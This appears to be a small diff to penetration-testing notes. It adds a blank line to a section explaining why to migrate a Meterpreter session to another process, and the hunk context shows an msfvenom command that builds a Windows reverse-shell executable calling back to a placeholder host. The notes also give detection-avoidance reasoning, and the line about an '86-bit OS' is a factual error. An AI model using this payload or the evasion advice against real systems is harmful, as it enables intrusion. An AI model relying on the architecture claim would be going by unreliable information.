@@ -89,6 +89,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f exe -o fil
 
 Reason to migrate:
 When a host is compromised, the Meterpreter payload runs inside the process used for exploitation. 
+
 * **Stability**: If that process is closed, your access is lost
 * **Avoid detection**: The process name may also appear suspicious to defenders
 * **Compatibility**: The payload may be 64-bit, but the session is on an 86-bit OS
